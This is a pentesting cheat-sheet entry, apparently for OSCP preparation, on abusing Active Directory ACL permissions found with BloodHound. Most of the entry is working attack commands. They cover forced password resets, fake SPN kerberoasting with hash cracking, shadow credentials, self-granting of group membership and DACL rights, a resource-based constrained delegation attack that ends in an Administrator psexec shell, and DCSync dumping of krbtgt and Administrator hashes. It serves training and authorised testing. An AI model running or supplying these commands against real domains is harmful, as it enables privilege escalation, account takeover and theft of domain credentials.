title: ACL Abuse — GenericAll, GenericWrite, WriteDACL, ForceChangePassword
body:
Active Directory ACL misconfigurations let low-privilege accounts take control of higher-privilege objects without any exploit. BloodHound surfaces these as edges — the label tells you exactly what you can do.

The four most common edges and what each means:

GenericAll — full control of the object. On a user: reset password, add SPN (kerberoast), add to any group. On a group: add members. On a computer: RBCD attack. On a GPO: modify GPO settings (SharpGPOAbuse).

GenericWrite — write to most attributes. On a user: add SPN (kerberoast), write logon script, shadow credentials. On a group: add members.

WriteDACL — write the DACL. Grants yourself GenericAll first, then execute GenericAll path. One extra step but same result.

ForceChangePassword — reset a user's password without knowing the current one. Instant lateral move to that account.

WriteOwner — take ownership of the object. Owner can then modify DACL → WriteDACL path.

The chain: BloodHound shows the edge → identify the object type (user/group/computer/GPO) → pick the right abuse technique for that edge+object combo.
cmd:
# ══════════════════════════════════════════════════
# ENUMERATE — WHO HAS WHAT (PowerView)
# ══════════════════════════════════════════════════
powershell -ep bypass
Import-Module .\PowerView.ps1

# What can my current user do?
Get-DomainObjectAcl -Identity <target-user-or-group> -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -match '<your-user-SID>'
} | Select ActiveDirectoryRights, ObjectDN

# Find ALL interesting ACEs in the domain:
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -match '<your-user>'
}

# Get your SID:
(Get-ADUser <your-user>).SID
# or: [System.Security.Principal.WindowsIdentity]::GetCurrent().User

# ══════════════════════════════════════════════════
# FORCECHANGEPASSWORD — reset target user password
# ══════════════════════════════════════════════════
$pass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target-user> -AccountPassword $pass
# Then log in with new password:
evil-winrm -i <machine> -u <target-user> -p 'NewPass123!'

# With explicit creds (if running as different account):
$cred = New-Object System.Management.Automation.PSCredential('<domain>\<your-user>', (ConvertTo-SecureString '<your-pass>' -AsPlainText -Force))
Set-DomainUserPassword -Identity <target-user> -AccountPassword $pass -Credential $cred

# Or net rpc (from Kali):
net rpc password <target-user> 'NewPass123!' -U '<domain>/<your-user>%<your-pass>' -S <dc-ip>

# ══════════════════════════════════════════════════
# GENERICWRITE ON USER — Add SPN → Kerberoast
# ══════════════════════════════════════════════════
# Set a fake SPN on the target user:
Set-DomainObject -Identity <target-user> -Set @{serviceprincipalname='fake/BLAH'}
# Now kerberoast them:
Get-DomainSPNTicket -Identity <target-user> | Export-Csv -NoTypeInformation spn.csv
# Or from Kali:
impacket-GetUserSPNs <domain>/<your-user>:'<pass>' -dc-ip <dc-ip> -request
# Crack the TGS: hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
# Clean up after:
Set-DomainObject -Identity <target-user> -Clear serviceprincipalname

# ══════════════════════════════════════════════════
# GENERICWRITE ON USER — Shadow Credentials
# ══════════════════════════════════════════════════
# (requires ADCS or MS-PKINIT — check if DC has a cert)
# Add a KeyCredential (shadow cert) to target:
# Whisker from Windows:
.\Whisker.exe add /target:<target-user>
# This outputs a Rubeus command — run it to get a TGT as target user
# Or from Kali:
pywhisker -d <domain> -u <your-user> -p '<pass>' --target <target-user> --action add

# ══════════════════════════════════════════════════
# GENERICWRITE ON GROUP — Add member
# ══════════════════════════════════════════════════
Add-DomainGroupMember -Identity '<target-group>' -Members '<your-user>'
# Verify:
Get-DomainGroupMember '<target-group>'
# Now reload your token (log off/on or new evil-winrm session):
evil-winrm -i <machine> -u <your-user> -p '<pass>'

# ══════════════════════════════════════════════════
# WRITEDACL — Grant yourself GenericAll, then proceed
# ══════════════════════════════════════════════════
$cred = New-Object System.Management.Automation.PSCredential('<domain>\<your-user>', (ConvertTo-SecureString '<your-pass>' -AsPlainText -Force))
Add-DomainObjectAcl -TargetIdentity '<target>' -PrincipalIdentity '<your-user>' -Rights All -Credential $cred
# Now you have GenericAll — proceed with GenericAll path above
# Clean up:
Remove-DomainObjectAcl -TargetIdentity '<target>' -PrincipalIdentity '<your-user>' -Rights All

# ══════════════════════════════════════════════════
# GENERICALL ON COMPUTER — RBCD Attack
# ══════════════════════════════════════════════════
# Step 1: Create a machine account you control:
impacket-addcomputer <domain>/<your-user>:'<pass>' -dc-ip <dc-ip> -computer-name 'EVIL$' -computer-pass 'EvilPass123!'
# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target:
Set-DomainObject -Identity <target-computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=([System.Security.Principal.SecurityIdentifier](Get-DomainComputer 'EVIL$').objectsid).GetBinaryForm()}
# Step 3: Get TGS as admin on target:
impacket-getST <domain>/'EVIL$':'EvilPass123!' -spn cifs/<target-computer>.<domain> -impersonate Administrator -dc-ip <dc-ip>
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<target-computer>.<domain>

# ══════════════════════════════════════════════════
# DCSYNC — if you have Replicating Directory Changes on domain root
# ══════════════════════════════════════════════════
# Grant DCSync rights:
Add-DomainObjectAcl -TargetIdentity '<domain-DN>' -PrincipalIdentity '<your-user>' -Rights DCSync
# Execute from Kali:
impacket-secretsdump <domain>/<your-user>:'<pass>'@<dc-ip>
# Or mimikatz:
# lsadump::dcsync /domain:<domain> /user:Administrator
# lsadump::dcsync /domain:<domain> /user:krbtgt
warn: Always identify the OBJECT TYPE the edge points to before choosing a technique — GenericWrite on a User, Group, Computer, and GPO each have different abuse paths. Check BloodHound's built-in abuse info for each edge (click the edge → Info tab) for the exact steps. After abusing ForceChangePassword or adding group members, the changed state persists in AD until someone fixes it — on a real engagement document and clean up. On OSCP labs cleanup is not required but it's good practice.

choices.label: Kerberoasted via GenericWrite SPN → crack hash
Added self to group → re-enumerate with new privileges
